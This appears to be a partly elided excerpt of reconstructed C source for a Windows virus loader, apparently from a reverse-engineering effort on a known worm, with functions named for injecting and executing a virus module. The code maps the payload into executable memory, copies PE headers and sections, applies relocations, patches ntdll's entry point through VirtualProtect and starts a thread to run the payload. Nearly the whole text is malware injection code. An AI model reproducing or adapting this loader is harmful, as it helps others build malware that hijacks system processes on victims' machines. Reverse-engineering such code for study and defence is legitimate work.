...
// 98% (C) CODE MATCH
INT32 BLOCK4_InjectAndExecuteVirus(
  ...
  pVirusModuleSection =
      (PVIRUS_MODULE_BLOCKS_HEADER)sASMCodeBlocksHeader->VirusModuleSection;
  pHardAddrs = (PHARDCODED_ADDRESSES)(
      sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress +
      _SIZE(&g_hardAddrs, __ASM_BLOCK1_0));

  BLOCK4_memcpy(&sInfoBlockCopy, pVirusModuleSection,
                sizeof(GENERAL_INFO_BLOCK));
  ...
  iResult = BLOCK4_LoadVirusModuleInfo(
      pHardAddrs, &sInfoBlockCopy,
      (PVOID)pVirusModuleSection->VirusModuleSegment.SegmentAddress,
      pVirusModuleSection->VirusModuleSegment.SegmentSize);
  if (iResult)
    return iResult;
  ...
  if (pVirusModuleSection->LibraryExecuteEntryNumber != -1) {
    // Create thread where entrypoint is this function with the same parameter
    // as was given to us
    hThread = pHardAddrs->CreateThread(
        NULL, 0x00080000,
        (LPTHREAD_START_ROUTINE)sASMCodeBlocksHeader->ExecuteLibrary,
        sASMCodeBlocksHeader, 0, NULL);
...
// 99% (C) CODE MATCH
// This runs on virus startup I think
INT32 BLOCK4_ExecuteLibrary(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader) {
  ...
  pLibraryExecEntry = pHardAddrs->GetProcAddress(
      pVirusModuleSection->VirusModulePointer,
      (LPCSTR)pVirusModuleSection->LibraryExecuteEntryNumber);

  if (pLibraryExecEntry) {
    // Note: Same arguments passed to the 15th function of the internal library,
    // maybe it was another module loaded in the past?
    // As-is, this is calling the function with the arguments (NULL, 0)
    ((__tLibraryExecEntry)pLibraryExecEntry)(
        pVirusModuleSection->UnknownSegment.SegmentAddress,
        pVirusModuleSection->UnknownSegment.SegmentSize);
    return 0;
  }
...
// 99% (C) CODE MATCH
void BLOCK4_CopyPEHeaderInfo(PGENERAL_INFO_BLOCK sInfoBlock,
                             PIMAGE_NT_HEADERS pImageNT,
                             INT32 iVirusModuleSize) {
  sInfoBlock->AbsoluteEntryPoint = pImageNT->OptionalHeader.ImageBase +
  ...
  sInfoBlock->MinorSubsystemVersion =
      pImageNT->OptionalHeader.MinorSubsystemVersion;
  sInfoBlock->MajorSubsystemVersion =
      pImageNT->OptionalHeader.MajorSubsystemVersion;
...
NTSTATUS BLOCK4_AlignAddresses(PIMAGE_DOS_HEADER *pImageDOS) {
  ...
  if (!pImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
           .Size)
    return STATUS_CONFLICTING_ADDRESSES;

  for (i = (PIMAGE_BASE_RELOCATION)(
           pImageNT->OptionalHeader
               .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
               .VirtualAddress +
           pImageBase);
       i->SizeOfBlock; i += i->SizeOfBlock / sizeof(IMAGE_BASE_RELOCATION)) {
    ...
    for (j = 0; j < iDeltaSizeOfBlock / 2; ++j) {
      if ((UINT8)((*wTypeOffset / 0x100) / 0x10) != IMAGE_REL_BASED_ABSOLUTE) {
        ...
        dwItemAddress =
            (DWORD *)((*wTypeOffset & 0x0FFF) + i->VirtualAddress + pImageBase);
...
__declspec(naked) void BLOCK4_memcpy(void *pDestination, const void *pSource,
                                     unsigned int iSize) {
  __asm {
		push    ebp
		mov     ebp, esp
...
// 99% (C) CODE MATCH
void BLOCK4_CopyDataIntoMapView(PVOID pVirusModule, PIMAGE_NT_HEADERS pImageNT,
                                LPVOID pMapViewOfFile) {
  // Copy the headers first
  BLOCK4_memcpy(pMapViewOfFile, pVirusModule,
                pImageNT->OptionalHeader.SizeOfHeaders);

  PIMAGE_SECTION_HEADER pCurrSection = (PIMAGE_SECTION_HEADER)(
      (DWORD)pImageNT + pImageNT->FileHeader.SizeOfOptionalHeader +
  ...
  for (dwCurrentSection = 0; dwCurrentSection < dwNumberOfSections;
       dwCurrentSection++, pCurrSection++) {
    if (pCurrSection
            ->SizeOfRawData) // If the section VirtualSize is valid, copy
                             // the entire section
      BLOCK4_memcpy(
          (void *)((DWORD)pMapViewOfFile + pCurrSection->VirtualAddress),
          (const void *)((DWORD)pVirusModule + pCurrSection->PointerToRawData),
          pCurrSection->SizeOfRawData);
  }
}

// 99% (C) CODE MATCH
INT32 BLOCK4_InjectCodeIntoNTDLL(ASM_CODE_BLOCKS_HEADER *sASMCodeBlocksHeader,
  ...
  if (!pHardAddrs->NTDLL_DLL)
    return 0;

  NTDLL_Entry = (void *)(hHandleNTDLL + 16);
  if (*(_DWORD *)(hHandleNTDLL + 16) == 0xAB49103B)
    return 0;
  // Check if the code has been already injected
  if (pHardAddrs->VirtualProtect(hHandleNTDLL, 0x1000, PAGE_EXECUTE_WRITECOPY,
                                 &dwOld)) {
    // Copy code into ntdll entry point...
    BLOCK4_memcpy(
        NTDLL_Entry,
        (const void *)sASMCodeBlocksHeader->ASMBlock0Segment.SegmentAddress,
        sASMCodeBlocksHeader->ASMBlock0Segment.SegmentSize);

    // ...then call __ASM_BLOCK1_0 with a pointer to the entry point as ECX(
    // because __thiscall )
    ((void(__thiscall *)(
        void *))sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress)(
        NTDLL_Entry); // __thiscall ignored by compiler
...
// 97% (C) CODE MATCH
INT32 BLOCK4_LoadVirusModuleInfo(PHARDCODED_ADDRESSES pHardAddrs,
                                 GENERAL_INFO_BLOCK *sInfoBlock,
                                 PVOID pVirusModule, INT32 iVirusModuleSize) {
  ...
  iStatus = pHardAddrs->ZwCreateSection(&hSectionHandle, SECTION_ALL_ACCESS, 0,
                                        &liMaximumSize, PAGE_EXECUTE_READWRITE,
                                        SEC_COMMIT, 0);
  if (iStatus != STATUS_SUCCESS)
    return -11;

  pMapViewOfFile = pHardAddrs->MapViewOfFile(
      hSectionHandle, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
  if (!pMapViewOfFile) {
